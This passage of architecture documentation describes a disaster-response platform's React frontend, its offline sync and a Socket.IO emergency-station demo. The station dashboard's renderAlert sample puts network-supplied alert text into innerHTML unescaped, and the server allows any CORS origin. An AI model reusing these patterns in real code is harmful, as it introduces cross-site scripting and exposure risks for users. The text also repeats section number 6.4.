    const [user, setUser] = useState(null);
    const [loading, setLoading] = useState(true);

    // Restore session on mount
    useEffect(() => {
      const restore = async () => {
        const stored = getStoredAuth();
        if (stored?.pin) {
          const session = await checkSession();
          if (session.authenticated) {
            setUser(session.user);
          }
        }
        setLoading(false);
      };
      restore();
    }, []);

    const login = async (pin, mode = 'volunteer') => {
      const result = await loginWithPin(pin);
      if (result.success) {
        setUser(result.data);
        initializeAuth();  // Set axios headers
      }
      return result;
    };

    const logout = async () => {
      await logoutUser();
      clearStoredAuth();
      setUser(null);
    };

    // Computed values
    const value = {
      user,
      loading,
      login,
      logout,
      isAuthenticated: !!user,
      isManager: user?.role === 'manager',
      isVolunteer: user?.role === 'volunteer'
    };

    return (
      <AuthContext.Provider value={value}>
        {children}
      </AuthContext.Provider>
    );
  }

  // Usage in any component
  function SomeComponent() {
    const { isManager, logout } = useAuth();
    
    return (
      <div>
        {isManager && <AdminPanel />}
        <button onClick={logout}>Logout</button>
      </div>
    );
  }

6.1 REACT APPLICATION STRUCTURE
-------------------------------
The frontend is a single-page application built with React and Vite:

main.jsx:
- Renders App component
- Imports global styles and i18n

App.jsx:
- Wraps with QueryClientProvider (React Query)
- Wraps with AuthProvider (authentication context)
- Wraps with AccessibilityProvider
- Defines routes with React Router

Routing Structure:
- /dashboard - Manager dashboard (protected)
- /tasks - Volunteer task list (protected)
- /resources - Resource management (manager only)
- / - Redirects based on role

REACT DATA FLOW ARCHITECTURE:
-----------------------------
The frontend follows a unidirectional data flow pattern:

┌─────────────────────────────────────────────────────────────────────────────┐
│                         REACT APPLICATION DATA FLOW                          │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│   ┌─────────────────┐                                                        │
│   │  React Context  │  (Global State)                                       │
│   │  ─────────────  │                                                        │
│   │  • AuthContext  │ ─── user, isManager, isVolunteer, login(), logout()   │
│   │  • AccessibilityContext │ ─── fontSize, contrast, theme                 │
│   │  • VolunteerRouteContext │ ─── activeRoute, currentLocation             │
│   └────────┬────────┘                                                        │
│            │ useContext()                                                    │
│            ▼                                                                 │
│   ┌─────────────────┐                                                        │
│   │  React Query    │  (Server State)                                       │
│   │  ─────────────  │                                                        │
│   │  • useQuery     │ ─── GET requests, auto-refetch, caching               │
│   │  • useMutation  │ ─── POST/PATCH requests, cache invalidation           │
│   │  • queryClient  │ ─── Cache management, invalidation                    │
│   └────────┬────────┘                                                        │
│            │ data, isLoading, error                                          │
│            ▼                                                                 │
│   ┌─────────────────┐                                                        │
│   │    Pages        │  (Route Components)                                   │
│   │  ─────────────  │                                                        │
│   │  • DashboardPage│ ─── Map + Missions + Reports                          │
│   │  • VolunteerPage│ ─── Tasks + Reporting                                 │
│   │  • ResourcesPage│ ─── Shelters + Inventory                              │
│   └────────┬────────┘                                                        │
│            │ props                                                           │
│            ▼                                                                 │
│   ┌─────────────────┐                                                        │
│   │   Components    │  (Reusable UI)                                        │
│   │  ─────────────  │                                                        │
│   │  • Map          │ ─── Leaflet container                                 │
│   │  • MapPin       │ ─── Custom markers                                    │
│   │  • RouteLine    │ ─── Route polylines                                   │
│   │  • TaskList     │ ─── Verification list                                 │
│   └────────┬────────┘                                                        │
│            │ callbacks (onClick, onSubmit)                                   │
│            ▼                                                                 │
│   ┌─────────────────┐                                                        │
│   │   Services      │  (API Layer)                                          │
│   │  ─────────────  │                                                        │
│   │  • apiService   │ ─── All API calls                                     │
│   │  • authService  │ ─── Login/logout                                      │
│   │  • syncService  │ ─── Offline sync                                      │
│   └────────┬────────┘                                                        │
│            │ HTTP requests                                                   │
│            ▼                                                                 │
│   ┌─────────────────┐                                                        │
│   │   Backend API   │  (Express Server)                                     │
│   └─────────────────┘                                                        │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘

DASHBOARD PAGE DATA FLOW (Detailed):
------------------------------------
File: frontend/src/pages/DashboardPage.jsx

1. INITIAL RENDER:
   
   function DashboardPage() {
     // Get auth context
     const { isManager, isVolunteer } = useAuth();
     
     // Fetch needs for map (React Query)
     const { data: needsData, isLoading, refetch } = useQuery({
       queryKey: ['map-needs'],
       queryFn: () => getNeedsForMap(),
       refetchInterval: 30000  // Auto-refresh every 30 seconds
     });
     
     // Fetch missions
     const { data: missions } = useQuery({
       queryKey: ['missions'],
       queryFn: () => getMissions()
     });
     
     // Fetch reports
     const { data: reports } = useQuery({
       queryKey: ['reports'],
       queryFn: () => getReports()
     });
     
     // Local state
     const [selectedReportId, setSelectedReportId] = useState(null);
     const [activeTab, setActiveTab] = useState("map");
   }

2. DATA TRANSFORMATION:
   
   // Transform raw data for display
   const transformedNeeds = useMemo(() => {
     return needsData?.map(need => ({
       id: need.id,
       lat: need.lat,
       lon: need.lon,
       category: getTriageCategoryFromUrgency(need.urgency),
       description: need.description,
       status: need.status
     })) || [];
   }, [needsData]);

3. RENDER HIERARCHY:
   
   return (
     <div className="dashboard">
       <TabBar activeTab={activeTab} onChange={setActiveTab} />
       
       {activeTab === "map" && (
         <Map
           needs={transformedNeeds}        // Pass data down
           selectedNeedIds={[selectedReportId]}
           onPinClick={setSelectedReportId}  // Callback up
           missionRoutes={missions}
         />
       )}
       
       <MissionPanel
         missions={missions}
         onComplete={handleCompleteMission}  // Callback
         onReroute={handleStartReroute}      // Callback
       />
     </div>
   );

4. USER INTERACTION → STATE UPDATE → RE-RENDER:
   
   // User clicks "Complete" on a mission
   const handleCompleteMission = async (missionId) => {
     await completeMission(missionId);  // API call
     
     // Invalidate cache → triggers refetch → new data → re-render
     queryClient.invalidateQueries({ queryKey: ['missions'] });
     queryClient.invalidateQueries({ queryKey: ['map-needs'] });
   };

COMPONENT PROPS FLOW EXAMPLE:
-----------------------------

DashboardPage (container)
    │
    │ needs=[{id, lat, lon, urgency, ...}]
    │ missionRoutes=[{routes, stationType}]
    │ onPinClick={(id) => setSelectedReportId(id)}
    ▼
  Map.jsx
    │
    │ For each need:
    │   position={[need.lat, need.lon]}
    │   category={need.urgency}
    │   onClick={() => onPinClick(need.id)}
    ▼
  MapPin.jsx
    │
    │ Renders Leaflet marker
    │ On click: calls props.onClick()
    │ → Bubbles up to DashboardPage
    │ → Updates selectedReportId state
    │ → Triggers re-render
    │ → MapPin receives isSelected=true
    │ → Renders with highlight style
    ▼
  Leaflet DOM

6.2 PAGES
---------
DashboardPage.jsx:
- Main manager interface
- Tabs: Map view, Analytics, Resources
- Panels: Missions, Reports, Volunteers
- Real-time data fetching with React Query
- Displays all needs/reports on map
- Mission management (complete, reroute)
- SOS alert monitoring

VolunteerPage.jsx:
- Volunteer interface
- Audio reporting via microphone
- Photo reporting with camera
- Task verification list
- Missing person report form
- Floating SOS button

ResourcesPage.jsx:
- Shelter management
- Resource inventory
- Volunteer assignment

6.3 COMPONENTS
--------------
Map.jsx:
- Leaflet map container
- Renders emergency station markers
- Renders report/need pins (MapPin)
- Draws mission routes (RouteLine)
- Volunteer location tracking
- Offline map tile caching

MapPin.jsx:
- Custom markers for different need types
- Color-coded by urgency/category
- Click handlers for selection

RouteLine.jsx:
- Renders polylines for mission routes
- Color-coded by station type
- Animated route visualization

SyncStatus.jsx:
- Displays offline queue status
- Shows pending verifications count
- Indicates sync progress

VolunteerTaskList.jsx:
- Lists assigned tasks
- Verification workflow
- Flag suspicious reports

COMPONENT DATA FLOW DETAILS:
----------------------------

AUDIO REPORTER COMPONENT (AudioReporter.jsx):
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
State Management:
- isRecording: boolean - whether recording in progress
- audioBlob: Blob - recorded audio data
- audioUrl: string - object URL for audio playback
- permissionStatus: 'granted'|'denied'|'prompt'
- isUploading: boolean - upload in progress
- uploadSuccess: boolean - last upload status
- recordingTime: number - seconds recorded

Recording Flow:
1. User clicks microphone button
2. Component requests microphone permission:
   navigator.mediaDevices.getUserMedia({ audio: true })
3. Creates MediaRecorder with stream:
   const mediaRecorder = new MediaRecorder(stream, {
     mimeType: 'audio/webm'
   });
4. Collects audio chunks:
   mediaRecorder.ondataavailable = (event) => {
     audioChunksRef.current.push(event.data);
   };
5. On stop, creates Blob:
   const blob = new Blob(audioChunksRef.current, { type: 'audio/webm' });
   
Upload Flow:
1. User clicks "Upload" button
2. Gets current geolocation:
   location = await getCurrentLocation();
3. Creates File object from Blob:
   const file = new File([audioBlob], 'voice-report.webm', {type: 'audio/webm'});
4. Calls upload service:
   await uploadAudioReport(file, location);
5. Service sends FormData to backend:
   POST /api/v1/reports/audio
   Content-Type: multipart/form-data
   Body: { audio: file, location: JSON }
6. Backend transcribes with Google Gemini
7. NLP extracts needs → creates Need documents

PHOTO REPORTER COMPONENT (PhotoReporter.jsx):
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
State Management:
- imageFile: File - selected image
- previewUrl: string - object URL for preview
- caption: string - user description
- isCameraOpen: boolean - camera modal open
- stream: MediaStream - camera video stream
- isUploading/uploadSuccess: upload state

Camera Flow:
1. User clicks "Open Camera"
2. Requests camera permission:
   navigator.mediaDevices.getUserMedia({
     video: { facingMode: 'environment' }  // back camera
   });
3. Attaches stream to <video> element
4. On capture, draws frame to <canvas>:
   context.drawImage(video, 0, 0, width, height);
5. Converts canvas to Blob:
   canvas.toBlob((blob) => {
     const file = new File([blob], 'photo.jpg', {type: 'image/jpeg'});
     setImageFile(file);
   }, 'image/jpeg', 0.8);

Upload Flow:
1. User adds optional caption, clicks "Submit"
2. Gets current geolocation
3. Calls upload service:
   await uploadPhotoReport(imageFile, location, caption);
4. Service sends FormData:
   POST /api/v1/reports/photo
   Content-Type: multipart/form-data
   Body: { photo: file, location: JSON, caption: string }
5. Backend uploads to Cloudinary → gets URL
6. Sentinel Agent classifies image → detects disaster type
7. Creates Report with image URL and classification

MAP COMPONENT (Map.jsx) DATA FLOW:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Props Interface:
- needs: Array - Need objects to display as pins
- selectedNeedIds: Set - IDs of highlighted needs
- onPinClick: (id) => void - callback when pin clicked
- missionRoutes: Array - route polylines to draw
- isRerouteMode: boolean - enable station selection
- onStationClick: (station) => void - reroute callback
- volunteerMode: boolean - show volunteer-specific UI
- volunteerLocation: {lat, lng} - volunteer's position
- volunteerRoute: Array - route to task

Internal Data Fetching:
useEffect(() => {
  const fetchStations = async () => {
    const response = await getAllStations({ status: 'active' });
    setRegisteredStations(response.data.stations);
  };
  fetchStations();
}, []);

Render Layers (order matters for z-index):
1. TileLayer - OpenStreetMap base tiles
2. Emergency Station Markers - police, hospital, fire, rescue
3. Volunteer Location Marker - current position
4. MapPin components - for each need/report
5. RouteLine components - mission/volunteer routes
6. OfflineMapManager - tile caching controls

Event Handling:
- Station click in reroute mode → calls onStationClick(station)
- Pin click → calls onPinClick(need.id)
- Map drag/zoom → Leaflet internal handling

VOLUNTEER TASK LIST (VolunteerTaskList.jsx) DATA FLOW:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Props:
- tasks: Array - assigned verification tasks
- onVerify: (taskId, status, notes) => void
- onFlag: (taskId, reason) => void

Task Item Structure:
{
  id: string,
  type: 'verify_report' | 'verify_need',
  target: {
    id: string,
    description: string,
    location: { lat, lng }
  },
  assignedAt: Date,
  status: 'pending' | 'in_progress' | 'completed'
}

Verification Flow:
1. Volunteer clicks task → expands details
2. Volunteer navigates to location (uses volunteerRoute)
3. Volunteer clicks "Verify" → opens verification modal
4. Modal options:
   - Confirm Valid: onVerify(taskId, 'confirmed', notes)
   - Report Invalid: onVerify(taskId, 'invalid', notes)
   - Flag Suspicious: onFlag(taskId, reason)
5. Callbacks trigger mutations:
   useMutation({
     mutationFn: (data) => submitVerification(data),
     onSuccess: () => {
       queryClient.invalidateQueries(['tasks']);
       queryClient.invalidateQueries(['map-needs']);
     }
   });

ACCESSIBILITY SETTINGS (AccessibilitySettings.jsx):
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Context Integration:
- Uses AccessibilityContext for global settings
- Settings persist to localStorage

Available Settings:
- fontSize: 'small' | 'medium' | 'large' | 'extra-large'
- contrast: 'normal' | 'high'
- reducedMotion: boolean
- screenReaderMode: boolean

Application Flow:
1. User opens accessibility panel
2. Changes settings via controls
3. Context updates global state:
   setFontSize('large');
4. CSS variables update via useEffect:
   document.documentElement.style.setProperty('--font-size-base', '18px');
5. All components inherit updated styles
6. Settings saved to localStorage:
   localStorage.setItem('accessibility', JSON.stringify(settings));

6.4 APPLICATION PROVIDER HIERARCHY
----------------------------------
The application wraps components in nested providers for state management:

┌───────────────────────────────────────────────────────────────────────────┐
│                        PROVIDER HIERARCHY                                  │
├───────────────────────────────────────────────────────────────────────────┤
│                                                                            │
│  main.jsx                                                                  │
│  ├── <React.StrictMode>                                                    │
│  │   └── <ErrorBoundary>               [Catches render errors]            │
│  │       └── <AppWrapper>              [Wraps all providers]              │
│  │                                                                         │
│  AppWrapper (App.jsx)                                                      │
│  ├── <AccessibilityProvider>           [Font size, contrast, motion]      │
│  │   └── <QueryClientProvider>         [React Query cache]                │
│  │       └── <AuthProvider>            [User, role, login/logout]         │
│  │           └── <VolunteerRouteProvider>  [Active route, location]       │
│  │               └── <App />           [Main application]                 │
│  │                                                                         │
│  App Component                                                             │
│  ├── if (!isAuthenticated) → <PinLogin />                                 │
│  └── if (isAuthenticated) → <AuthenticatedApp />                          │
│      └── <BrowserRouter>                                                   │
│          ├── <header>                  [Navigation bar]                   │
│          ├── <Routes>                  [Page routing]                     │
│          │   ├── /dashboard → <DashboardPage />                           │
│          │   ├── /tasks → <VolunteerPage />                               │
│          │   ├── /resources → <ResourcesPage />                           │
│          │   └── /emergency-stations → <EmergencyStations />              │
│          └── <AccessibilitySettings />  [Modal overlay]                   │
│                                                                            │
└───────────────────────────────────────────────────────────────────────────┘

CONTEXT DETAILS:

1. AccessibilityContext (AccessibilityProvider):
   Provides: {
     fontSize: string,
     setFontSize: (size) => void,
     contrast: string,
     setContrast: (mode) => void,
     reducedMotion: boolean,
     setReducedMotion: (bool) => void
   }
   Persistence: localStorage
   
2. QueryClientProvider:
   Provides: React Query's queryClient
   Configuration:
     const queryClient = new QueryClient({
       defaultOptions: {
         queries: {
           refetchOnWindowFocus: false,  // Don't refetch on tab focus
           retry: 1,                      // Only retry failed requests once
         }
       }
     });
   
   Common Query Keys Used:
   - ['map-needs'] - Needs for map display
   - ['missions'] - Active missions
   - ['reports'] - All reports
   - ['tasks'] - Volunteer tasks
   - ['shelters'] - Shelter list
   - ['analytics'] - Dashboard analytics
   - ['missing-persons'] - Missing person reports

3. AuthContext (AuthProvider):
   Provides: {
     user: object | null,
     token: string | null,
     isAuthenticated: boolean,
     isManager: boolean,
     isVolunteer: boolean,
     loading: boolean,
     login: (pin, mode) => Promise,
     logout: () => void
   }
   Persistence: localStorage (token), IndexedDB (user data)

4. VolunteerRouteContext (VolunteerRouteProvider):
   Provides: {
     activeRoute: Array | null,
     currentLocation: { lat, lng } | null,
     targetLocation: { lat, lng } | null,
     isRouteFallback: boolean,
     setTargetLocation: (location) => void,
     clearRoute: () => void
   }
   Purpose: Tracks volunteer navigation to task locations

REACT QUERY CACHE INVALIDATION STRATEGY:
----------------------------------------
The application uses React Query's cache invalidation to keep data fresh:

1. After creating a report:
   queryClient.invalidateQueries({ queryKey: ['reports'] });
   queryClient.invalidateQueries({ queryKey: ['map-needs'] });

2. After completing a mission:
   queryClient.invalidateQueries({ queryKey: ['missions'] });
   queryClient.invalidateQueries({ queryKey: ['map-needs'] });

3. After verifying a task:
   queryClient.invalidateQueries({ queryKey: ['tasks'] });
   queryClient.invalidateQueries({ queryKey: ['map-needs'] });

4. After sync completes:
   queryClient.invalidateQueries();  // Invalidate all

5. Automatic refetch intervals:
   - Map needs: 30 seconds
   - Missions: 30 seconds
   - SOS alerts: 10 seconds

- Works offline with IndexedDB

AudioReporter.jsx:
- Microphone access for voice reports
- Recording and playback
- Upload to server

PhotoReporter.jsx:
- Camera access for photo reports
- Image preview and cropping
- Upload with location

AccessibilitySettings.jsx:
- Font size adjustment
- High contrast mode
- Screen reader support

AnalyticsDashboard.jsx:
- Report statistics
- Charts and graphs
- Performance metrics

EmergencyStations.jsx:
- List registered stations
- Registration form
- Status management

6.4 SERVICES
------------
api.js:
- Axios instance configuration
- Base URL from environment
- Auth header interceptors
- Credentials for session cookies

apiService.js:
- reportsAPI: CRUD for reports
- needsAPI: SMS needs management
- missionsAPI: Mission operations
- tasksAPI: Volunteer tasks
- missingPersonsAPI: Missing person cases
- sheltersAPI: Shelter management

authService.js:
- loginWithPin(pin): Authenticate
- logout(): Clear session
- checkSession(): Validate session
- getStoredAuth(): Local storage

syncService.js:
- Manages offline queue
- Syncs when online
- Broadcasts sync events

db.js (Dexie/IndexedDB):
- pendingVerifications: Offline task updates
- offlineReports: Queued reports
- mapTiles: Cached map tiles

emergencyStationService.js:
- registerStation(data)
- getAllStations(filters)
- deleteStation(id)
- dispatchAlert(stationId, alertData)

6.4.1 INDEXEDDB SCHEMA (db.js)
------------------------------
The application uses Dexie.js (IndexedDB wrapper) for offline storage:

DATABASE NAME: 'auraDB'
CURRENT VERSION: 4

SCHEMA DEFINITION:
  export const db = new Dexie("auraDB");
  
  db.version(4).stores({
    // Pending verification updates (offline queue)
    pendingVerifications: "++id, taskId",
    //   ++id = auto-increment primary key
    //   taskId = indexed for lookups
    
    // Offline reports awaiting sync
    offlineReports: "id, timestamp, hasImage",
    //   id = user-provided UUID
    //   timestamp = indexed for ordering
    //   hasImage = indexed for filtering
    
    // Cached map tiles
    mapTiles: "key",
    //   key = "{z}/{x}/{y}" tile coordinate
  });

STORAGE OPERATIONS:
  // Add pending verification
  await db.pendingVerifications.add({
    taskId: "507f1f77bcf86cd799439011",
    data: { notes: "Verified at scene" },
    timestamp: Date.now(),
  });
  
  // Query pending count
  const count = await db.pendingVerifications.count();
  
  // Get all pending
  const pending = await db.pendingVerifications.toArray();
  
  // Delete after sync
  await db.pendingVerifications.delete(id);
  
  // Store map tile
  await db.mapTiles.put({
    key: "15/19293/14563",
    blob: tileBlob,
    timestamp: Date.now(),
  });
  
  // Retrieve cached tile
  const tile = await db.mapTiles.get("15/19293/14563");

STORAGE LIMITS:
  - IndexedDB has browser-specific limits
  - Chrome: ~80% of available disk space
  - Firefox: ~50% of available disk space
  - Safari: ~1GB warning, user approval for more
  - Map tiles can consume significant space (~50KB per tile)

6.4.2 SYNC SERVICE (syncService.js)
-----------------------------------
Manages offline data synchronization:

SYNC EVENT NAME:
  export const SYNC_COMPLETE_EVENT = "verification-sync-complete";

SYNC FUNCTION:
  async function syncPendingVerifications() {
    // Guard: Only sync when online
    if (!navigator.onLine) {
      return { success: false, message: "Still offline", synced: 0, failed: 0 };
    }
    
    // Get all pending from IndexedDB
    const pendingVerifications = await db.pendingVerifications.toArray();
    
    if (pendingVerifications.length === 0) {
      return { success: true, message: "No pending", synced: 0, failed: 0 };
    }
    
    let synced = 0, failed = 0;
    const errors = [];
    
    // Process each pending item
    for (const verification of pendingVerifications) {
      try {
        // POST to server
        await postVerification(verification.taskId, verification.data?.notes);
        
        // Remove from IndexedDB on success
        await db.pendingVerifications.delete(verification.id);
        synced++;
      } catch (error) {
        failed++;
        errors.push({ taskId: verification.taskId, error: error.message });
      }
    }
    
    // Notify UI components
    if (synced > 0) {
      window.dispatchEvent(new CustomEvent(SYNC_COMPLETE_EVENT, {
        detail: { synced, failed, errors }
      }));
    }
    
    return { success: true, synced, failed, errors };
  }

AUTO-SYNC INITIALIZATION:
  function initSyncListeners() {
    let syncInProgress = false;
    
    const handleOnline = async () => {
      if (syncInProgress) return;  // Debounce
      
      syncInProgress = true;
      console.log("Network restored - syncing...");
      
      try {
        await syncPendingVerifications();
      } finally {
        syncInProgress = false;
      }
    };
    
    window.addEventListener("online", handleOnline);
    
    // Return cleanup function for React useEffect
    return () => window.removeEventListener("online", handleOnline);
  }

USAGE IN APP.JSX:
  useEffect(() => {
    if (isAuthenticated) {
      const cleanup = initSyncListeners();
      return cleanup;  // Cleanup on unmount or logout
    }
  }, [isAuthenticated]);

6.5 STATE MANAGEMENT
--------------------
React Query:
- Server state caching
- Automatic refetching
- Optimistic updates
- Query invalidation on mutations

React Context:
- AuthContext: User authentication state
- AccessibilityContext: UI preferences
- VolunteerRouteContext: Active route tracking

6.6 INTERNATIONALIZATION (I18N)
-------------------------------
Configured with i18next:

Supported Languages:
- English (en) - Default
- Hindi (hi) - हिन्दी
- Marathi (mr) - मराठी

Features:
- Browser language detection
- LocalStorage persistence
- Interpolation for dynamic values
- Translation JSON files in /locales

6.7 OFFLINE SUPPORT & PWA
-------------------------
Progressive Web App features:

IndexedDB Storage:
- pendingVerifications: Queued task verifications
- offlineReports: Reports created offline
- mapTiles: Cached map tiles for offline viewing

Service Worker:
- Configured via vite-plugin-pwa
- Precaches static assets
- Runtime caching for API calls

Sync Manager:
- Detects online/offline status
- Queues operations when offline
- Syncs automatically when online
- Broadcasts sync events for UI updates

================================================================================
                       7. EMERGENCY STATION DEMO
================================================================================

The station-demo module simulates emergency service stations that receive
alerts from the main platform.

STATION TYPES:
- Fire Station (port 4001)
- Hospital (port 4002)
- Police Station (port 4003)
- Rescue Team (port 4004)

FEATURES:
- Express server with Socket.IO
- Real-time alert notifications
- Audio alert sounds
- Dashboard UI for alert management
- Alert acknowledgment workflow

7.1 STATION CONFIGURATION
-------------------------
File: station-demo/config/stationConfig.js

STATION CONFIGURATIONS:
  const STATION_CONFIGS = {
    fire: {
      port: 4001,
      name: "Fire Station - Pune Central",
      type: "fire",
      emoji: "🚒",
      location: { lat: 18.5204, lng: 73.8567 },
      capabilities: ["fire_suppression", "rescue", "hazmat"],
      soundFile: "fire-alarm.mp3",
    },
    hospital: {
      port: 4002,
      name: "City General Hospital",
      type: "hospital",
      emoji: "🏥",
      location: { lat: 18.5314, lng: 73.8446 },
      capabilities: ["medical", "ambulance", "trauma"],
      soundFile: "hospital-alert.mp3",
    },
    police: {
      port: 4003,
      name: "Police Headquarters",
      type: "police",
      emoji: "🚔",
      location: { lat: 18.5089, lng: 73.8359 },
      capabilities: ["law_enforcement", "crowd_control", "investigation"],
      soundFile: "police-siren.mp3",
    },
    rescue: {
      port: 4004,
      name: "Rescue & Disaster Response",
      type: "rescue",
      emoji: "🆘",
      location: { lat: 18.5424, lng: 73.8291 },
      capabilities: ["search_rescue", "disaster_response", "evacuation"],
      soundFile: "rescue-alert.mp3",
    },
  };

STATION SELECTION (via environment):
  // Command line: STATION_TYPE=fire node server.js
  const stationType = process.env.STATION_TYPE || "fire";
  const stationConfig = STATION_CONFIGS[stationType];

7.2 SOCKET.IO IMPLEMENTATION
----------------------------
File: station-demo/server.js

SERVER INITIALIZATION:
  const httpServer = createServer(app);
  
  const io = new Server(httpServer, {
    cors: {
      origin: "*",              // Allow all origins (demo only)
      methods: ["GET", "POST"],
    },
    pingTimeout: 60000,         // Connection timeout
    pingInterval: 25000,        // Keep-alive interval
  });

SOCKET.IO EVENT HANDLERS:
  io.on("connection", (socket) => {
    console.log(`Dashboard connected: ${socket.id}`);
    
    // Send current alerts on connection
    Alert.find({ status: { $ne: "resolved" } })
      .sort({ createdAt: -1 })
      .limit(20)
      .then((alerts) => {
        socket.emit("initialAlerts", alerts);  // Send to this client only
      });
    
    // Handle alert acknowledgment
    socket.on("acknowledgeAlert", async (alertId) => {
      const alert = await Alert.findOneAndUpdate(
        { alertId },
        {
          status: "acknowledged",
          acknowledgedAt: new Date(),
        },
        { new: true }
      );
      
      if (alert) {
        io.emit("alertUpdated", alert);  // Broadcast to ALL clients
      }
    });
    
    // Handle status updates (in_progress, resolved)
    socket.on("updateAlertStatus", async ({ alertId, status }) => {
      const updates = { status };
      if (status === "resolved") {
        updates.resolvedAt = new Date();
      }
      
      const alert = await Alert.findOneAndUpdate(
        { alertId },
        updates,
        { new: true }
      );
      
      if (alert) {
        io.emit("alertUpdated", alert);
      }
    });
    
    socket.on("disconnect", () => {
      console.log(`Dashboard disconnected: ${socket.id}`);
    });
  });

7.3 ALERT API ENDPOINT
----------------------
File: station-demo/routes/alertRoutes.js

INCOMING ALERT ENDPOINT:
  POST /api/alerts
  
  Request Body:
  {
    "alertId": "ABC123",
    "reportId": "507f1f77bcf86cd799439011",
    "type": "fire",
    "severity": 8,
    "location": {
      "lat": 18.5204,
      "lng": 73.8567,
      "address": "123 Main St, Pune"
    },
    "description": "Building fire reported",
    "needs": ["Fire Suppression", "Rescue"],
    "estimatedVictims": 5,
    "sourceStation": "Main Backend"
  }

ALERT PROCESSING:
  router.post("/alerts", async (req, res) => {
    const io = req.app.get("io");
    const stationConfig = req.app.get("stationConfig");
    
    // Create alert document
    const alert = new Alert({
      ...req.body,
      stationId: stationConfig.stationId,
      stationType: stationConfig.type,
      status: "pending",
      receivedAt: new Date(),
    });
    
    await alert.save();
    
    // Emit to all connected dashboard clients
    io.emit("newAlert", alert);
    
    console.log(`[${stationConfig.name}] New alert received: ${alert.alertId}`);
    
    res.json({
      success: true,
      message: "Alert received",
      alertId: alert.alertId,
    });
  });

7.4 ALERT STATE MACHINE
-----------------------
Alert statuses flow through these states:

  ┌─────────────┐
  │   pending   │  (Just received, not seen)
  └──────┬──────┘
         │ User clicks "Acknowledge"
         ▼
  ┌─────────────┐
  │ acknowledged│  (Team notified, preparing)
  └──────┬──────┘
         │ User clicks "Dispatch"
         ▼
  ┌─────────────┐
  │ in_progress │  (Team en route/on scene)
  └──────┬──────┘
         │ User clicks "Resolve"
         ▼
  ┌─────────────┐
  │  resolved   │  (Emergency handled)
  └─────────────┘

7.5 FRONTEND DASHBOARD
----------------------
File: station-demo/public/index.html

SOCKET.IO CLIENT CONNECTION:
  const socket = io();  // Connect to same origin
  
  socket.on("connect", () => {
    console.log("Connected to station server");
  });
  
  socket.on("initialAlerts", (alerts) => {
    alerts.forEach(renderAlert);
  });
  
  socket.on("newAlert", (alert) => {
    playAlertSound();
    showNotification(alert);
    renderAlert(alert);
  });
  
  socket.on("alertUpdated", (alert) => {
    updateAlertCard(alert);
  });

ALERT SOUND PLAYBACK:
  function playAlertSound() {
    const audio = new Audio(`/sounds/${stationConfig.soundFile}`);
    audio.loop = true;
    audio.play().catch(e => console.log("Audio blocked by browser"));
    
    // Stop after 10 seconds or when acknowledged
    setTimeout(() => audio.pause(), 10000);
  }

ALERT CARD RENDERING:
  function renderAlert(alert) {
    const card = document.createElement("div");
    card.className = `alert-card ${alert.status} severity-${alert.severity}`;
    card.id = `alert-${alert.alertId}`;
    
    card.innerHTML = `
      <div class="alert-header">
        <span class="severity-badge">Severity: ${alert.severity}/10</span>
        <span class="status-badge">${alert.status}</span>
      </div>
      <h3>${alert.description}</h3>
      <p>Location: ${alert.location?.address || "Unknown"}</p>
      <p>Needs: ${alert.needs?.join(", ") || "General"}</p>
      <div class="alert-actions">
        ${getActionButtons(alert)}
      </div>
    `;
    
    document.getElementById("alerts-container").prepend(card);
  }

ACTION BUTTON HANDLERS:
  function acknowledgeAlert(alertId) {
    socket.emit("acknowledgeAlert", alertId);
  }
  
  function updateStatus(alertId, status) {
    socket.emit("updateAlertStatus", { alertId, status });
  }

================================================================================
                     8. DEPENDENCIES & LIBRARIES
================================================================================

ROOT PACKAGE:
- concurrently@8.2.2 - Run multiple npm scripts

BACKEND DEPENDENCIES:
- @google/generative-ai@0.24.1 - Google Gemini AI SDK
- cloudinary@1.41.3 - Image cloud storage
- connect-mongo@6.0.0 - MongoDB session store
- cors@2.8.5 - Cross-origin resource sharing
- dotenv@16.3.1 - Environment variables
- express@4.18.2 - Web framework
- express-session@1.18.2 - Session middleware
- express-validator@7.3.1 - Input validation
- mongoose@8.19.2 - MongoDB ODM
- multer@2.0.2 - File upload middleware
- node-fetch@3.3.2 - HTTP client
- openai@6.14.0 - OpenAI SDK (optional)
- twilio@5.10.4 - SMS integration
- uuid@13.0.0 - Unique ID generation

BACKEND DEV DEPENDENCIES:
- nodemon@3.0.1 - Hot reload for development

FRONTEND DEPENDENCIES:
- @tanstack/react-query@5.90.9 - Server state management
- axios@1.13.1 - HTTP client
- dexie@4.2.1 - IndexedDB wrapper
- dexie-react-hooks@4.2.0 - React hooks for Dexie
- html5-qrcode@2.3.8 - QR code scanning
- i18next@25.7.3 - Internationalization
- i18next-browser-languagedetector@8.2.0 - Language detection
- i18next-http-backend@3.0.2 - Translation loading
- leaflet@1.9.4 - Interactive maps
- leaflet-routing-machine@3.2.12 - Route visualization
- lucide-react@0.554.0 - Icon library
- lz-string@1.5.0 - String compression
- react@19.1.1 - UI framework
- react-dom@19.1.1 - React DOM rendering
- react-i18next@16.5.0 - React i18n hooks
- react-leaflet@5.0.0 - React Leaflet components
- react-qr-code@2.0.18 - QR code generation
- react-router-dom@7.9.5 - Client-side routing
- uuid@13.0.0 - Unique ID generation

FRONTEND DEV DEPENDENCIES:
- @eslint/js@9.36.0 - ESLint JavaScript config
- @types/react@19.1.16 - React type definitions
- @types/react-dom@19.1.9 - React DOM types
- @vitejs/plugin-react@5.0.4 - Vite React plugin
- eslint@9.36.0 - JavaScript linter
- eslint-plugin-react-hooks@5.2.0 - React hooks rules
- eslint-plugin-react-refresh@0.4.22 - Fast refresh rules
- globals@16.4.0 - Global variables
- vite@7.1.7 - Build tool
- vite-plugin-pwa@1.1.0 - PWA support

PYTHON AGENT DEPENDENCIES (requirements.txt):
- pymongo>=4.6.0 - MongoDB driver
- tensorflow - Deep learning framework
- Pillow>=10.0.0 - Image processing
- requests>=2.31.0 - HTTP client
- numpy>=1.24.0 - Numerical computing
- python-dotenv>=1.0.0 - Environment variables

STATION DEMO DEPENDENCIES:
- axios@1.6.0 - HTTP client
